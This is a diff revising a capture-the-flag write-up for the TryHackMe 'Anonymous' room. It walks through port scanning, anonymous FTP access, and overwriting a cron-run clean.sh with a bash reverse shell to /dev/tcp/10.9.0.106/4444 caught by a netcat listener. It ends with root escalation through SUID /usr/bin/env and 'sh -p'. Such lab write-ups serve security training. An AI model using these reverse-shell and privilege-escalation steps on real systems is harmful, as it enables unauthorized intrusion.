@@ -2,9 +2,9 @@ Challenge link → https://tryhackme.com/room/anonymous
 
 # Anonymous — TryHackMe Write-up
 
-Started with a full port scan.
+First, I performed a port scan — the most fundamental step in information gathering.
 
-> `--min-rate 5000` speeds things up; `-p-` checks all 65535 ports.
+> The `--min-rate 5000` option was used to speed up the scan, and `-p-` checks all ports (1–65535).
 > 
 
 ```
@@ -13,17 +13,17 @@ nmap -sS --min-rate 5000 -p- 10.201.43.68
 
 ![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-4 open ports found — the answer to Q1. The remaining 65,531 were closed or filtered.
+The scan results showed 4 open ports — the answer to Q1. The remaining 65,531 ports were closed or filtered.
 
-SSH is rarely a useful initial attack vector, so I focused on FTP and SMB.
+Since SSH is generally difficult to use as an initial attack vector, I decided to focus on the FTP and SMB services.
 
 **Q1: How many ports are open?**
 
 **Answer: 4**
 
-Service version scan next:
+Next, I performed a service version scan.
 
-> `-sC` runs default NSE scripts; `-sV` detects service versions.
+> The `-sC` option runs default NSE scripts, and `-sV` detects service versions.
 > 
 
 ```
@@ -32,7 +32,9 @@ nmap -sC -sV -p 21,22,139,445 10.201.43.68
 
 ![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-Answers to Q2 and Q3 appeared immediately. Also noteworthy: the hostname came back as "ANONYMOUS" — a very obvious hint toward anonymous access.
+The scan results easily revealed the answers to Q2 and Q3.
+
+It was also interesting that the hostname was "ANONYMOUS" — this could be a hint related to anonymous access.
 
 **Q2: What service is running on port 21?**
 
@@ -42,36 +44,47 @@ Answers to Q2 and Q3 appeared immediately. Also noteworthy: the hostname came ba
 
 **Answer: smb**
 
-Checked SMB first:
+I checked the SMB service first.
+
+> Used smbclient to list shared folders.
+> 
 
 ```
 smbclient -L //10.201.43.68 -N
 ```
 
-Found a share called `pics` — the answer to Q4. It contained `corgo2.jpg` and `puppos.jpeg`. I suspected steganography and ran strings, binwalk, etc., but found nothing.
+I found a shared folder called "pics" — the answer to Q4.
+
+Accessing it, I found two image files: corgo2.jpg and puppos.jpeg.
+
+Suspecting steganography, I analyzed them with tools like strings and binwalk, but found no hidden data.
 
 **Q4: There's a share on the user's computer. What's it called?**
 
 **Answer: pics**
 
-Given the hostname was literally "ANONYMOUS," anonymous FTP login seemed like a safe bet:
+Next, I attempted anonymous login to the FTP service.
+
+Given the hostname was "ANONYMOUS", I judged it likely that anonymous access would be permitted.
 
 ```yaml
 ftp 10.201.43.68
 Name: anonymous
-Password: (just press Enter)
+Password: (press Enter)
 ```
 
-Anonymous access was open. Inside: a `scripts` directory.
+As expected, anonymous access was allowed. Using the `ls` command, I discovered a `scripts` directory and navigated into it to check the files.
 
 ```bash
 ftp> cd scripts
 ftp> ls
 ```
 
-Three files:
+I found 3 files in the scripts directory.
 
-```
+I downloaded each file to inspect its contents.
+
+```csharp
 ftp> get clean.sh
 ftp> get removed_files.log
 ftp> get to_do.txt
@@ -79,7 +92,7 @@ ftp> get to_do.txt
 
 ###
 
-`clean.sh` contents:
+I checked the file contents using the `cat clean.sh` command.
 
 ![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
@@ -98,37 +111,45 @@ else
 fi
 ```
 
-What it does:
+After inspecting the file, this is what the script does:
 
-1. Sets `tmp_files` to 0
-2. If 0, logs "nothing to delete" to `removed_files.log`
-3. Otherwise deletes listed files and logs each deletion
-4. Log path is hardcoded as an absolute path
+1. Initializes the tmp_files variable to 0
+2. If the value is 0, it logs "nothing to delete" to removed_files.log
+3. If not 0, it deletes those files and logs each deletion
+4. The log file path is specified as an absolute path: /var/ftp/scripts/removed_files.log
 
-This script is almost certainly running automatically on a schedule.
+This script is most likely running automatically on the server.
+
+Next, I looked at removed_files.log.
 
 ![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-`removed_files.log` had "Running cleanup script: nothing to delete" repeated dozens of times. No timestamps, but the repetition clearly showed `clean.sh` was firing periodically. The very recent last-modified time backed that up.
+The log file had "Running cleanup script: nothing to delete" repeated dozens of times. There were no timestamps in the log, so I couldn't determine the exact execution interval, but the repeated messages showed that [clean.sh](http://clean.sh) was running periodically.
+
+The last modified time being very recent — October 5th at 09:45 — also supports that the cron job is still active.
+
+Next, I looked at to_do.txt.
 
 ![5](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-`to_do.txt`:
-
-```
+```visual-basic
 I really need to disable the anonymous login...it's really not safe
 ```
 
-A note from the admin saying they needed to disable anonymous login. Written in May 2020 — and clearly never acted on.
+A note, seemingly written by the admin, confirmed that anonymous login needed to be disabled. However, written in May 2020, it appears this was never actually done. This indicates that security settings have not been properly managed.
 
-Putting it together:
+Putting together what I've gathered so far:
 
-1. Anonymous FTP access works
-2. Need to check FTP write access
-3. `clean.sh` runs via cron
-4. If I can overwrite it, I get a reverse shell
+1. Anonymous FTP access is available
+2. Need to verify if FTP directory has write permissions
+3. [clean.sh](http://clean.sh) runs periodically as a cron job
+4. If I can modify [clean.sh](http://clean.sh), I can obtain a reverse shell
 
-Created a new `clean.sh` with a reverse shell payload:
+Based on these points, I decided to modify [clean.sh](http://clean.sh) to test FTP write permissions. If write access exists, I can replace it with a malicious script and obtain a reverse shell when the cron job executes.
+
+I created a new [clean.sh](http://clean.sh) on my local system containing a bash reverse shell payload.
+
+![6](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 ```bash
 cd ~
@@ -140,16 +161,18 @@ cat clean.sh
 
 Payload breakdown:
 
-- `bash -i`: launches interactive bash shell
+- `bash -i`: launches an interactive bash shell
 - `>&`: redirects stdout and stderr
-- `/dev/tcp/10.9.0.106/4444`: TCP connection back to attacker IP and port
+- `/dev/tcp/10.9.0.106/4444`: TCP connection to attacker IP and port
 - `0>&1`: redirects stdin to stdout
 
-10.9.0.106 is my VPN (tun0) address.
+This causes the server to connect a shell back to port 4444 on the attacker's system.
 
-![6](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
+Note: 10.9.0.106 is the IP address of the VPN interface (tun0).
 
-Uploaded via FTP:
+I uploaded the malicious script to the FTP server.
+
+![7](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/7.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
 ```yaml
 ftp 10.201.43.68
@@ -159,9 +182,11 @@ ftp> cd scripts
 ftp> put clean.sh
 ```
 
-Upload succeeded. File size changed from 314 bytes to 53 bytes — original replaced with my payload. Write access confirmed.
+The upload completed successfully. The file size changed from the original 314 bytes to 53 bytes, confirming the original file was replaced with our payload.
 
-Set up a netcat listener:
+Write permissions on FTP were confirmed, so all that was left was to wait for the cron job to execute.
+
+I set up a netcat listener to receive the reverse shell connection.
 
 ```
 nc -lvnp 4444
@@ -169,7 +194,7 @@ nc -lvnp 4444
 
 ![8](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-After about 1–5 minutes, the reverse shell connected:
+The exact execution interval of the cron job was unknown, but after waiting approximately 1–5 minutes, the server established the reverse shell connection. When the connection succeeds, the following message is displayed:
 
 ```
 Listening on 0.0.0.0 4444
@@ -178,11 +203,11 @@ Connection received on 10.201.43.68 40760
 
 ###
 
+After obtaining the shell, I checked my current location and privileges.
+
 ![9](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-Checked my position:
-
-```bash
+```markdown
 whoami
 # namelessone
 
@@ -197,7 +222,7 @@ cat user.txt
 # 90d6f99*************************740
 ```
 
-Shell as `namelessone`. Found `user.txt` in the home directory.
+I obtained a shell as the user namelessone and found the user.txt flag in the home directory.
 
 **Q5: user.txt**
 
@@ -205,44 +230,51 @@ Shell as `namelessone`. Found `user.txt` in the home directory.
 
 ###
 
-Time to escalate. Searched for SUID binaries — files that execute with their owner's (root's) privileges regardless of who runs them.
+Next, to escalate from a regular user to root, I searched for files with the SUID (Set User ID) bit set. Files with SUID execute with the file owner's permissions, so exploiting a root-owned SUID file enables privilege escalation.
 
-```bash
+```tsx
 find / -perm -4000 -type f 2>/dev/null
 ```
 
+Command breakdown:
+
+- `find /`: search from the root directory
+- `-perm -4000`: files with the SUID bit (4000) set
+- `-type f`: regular files only
+- `2>/dev/null`: suppress error messages
+
 ![10](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-Results:
+Several SUID files were found in the results:
 
-- `/usr/bin/passwd` — expected
-- `/usr/bin/su` — expected
-- `/usr/bin/env` — **suspicious** (SUID not normally needed here)
-- Other standard system binaries
+- /usr/bin/passwd — expected (needed for password changes)
+- /usr/bin/su — expected (needed for user switching)
+- /usr/bin/env — **abnormal** (SUID not normally needed here)
+- Other system binaries
 
-`/usr/bin/env` with SUID is unusual. `env` sets environment variables and launches programs — it has no business running as root. Clear privesc vector.
+Having SUID set on `/usr/bin/env` is abnormal. `env` is a utility for setting environment variables and running programs — it generally has no need for SUID. This is a clear privilege escalation vector.
 
 ### Privilege Escalation via env
 
-GTFOBins (https://gtfobins.github.io/) documents how to exploit Unix binaries to bypass security controls. From the SUID section for `env`:
+GTFOBins (https://gtfobins.github.io/) is a site that documents methods for exploiting Unix binaries to bypass security controls. Referencing the SUID section for `env`, the exploit method is as follows:
 
 ![11](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-```bash
+```python
 /usr/bin/env /bin/sh -p
 ```
 
-Breakdown:
+Command breakdown:
 
-- `/usr/bin/env`: run the SUID env binary
-- `/bin/sh`: launch a shell through it
-- `-p`: privileged mode — preserves SUID privileges
+- `/usr/bin/env`: run the SUID-set env binary
+- `/bin/sh`: launch a shell through env
+- `-p`: privileged mode (preserves SUID permissions)
 
-When env runs with SUID it inherits root. Launching `/bin/sh -p` through it gives a root shell. The `-p` flag is essential — without it, the shell drops back to the real user's permissions.
+When env runs with SUID, it holds root privileges, and executing `/bin/sh -p` through it launches a shell that maintains those root privileges. The `-p` flag is essential — without it, the shell may revert to the actual user's privileges.
 
 ![12](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)
 
-```bash
+```markdown
 whoami
 # root
 
@@ -250,7 +282,7 @@ cat /root/root.txt
 # 4d93009*************************363
 ```
 
-Root achieved. Grabbed `root.txt`.
+Privilege escalation succeeded and root access was obtained. I accessed the /root directory and confirmed the root.txt flag.
 
 **Q6: root.txt**
 
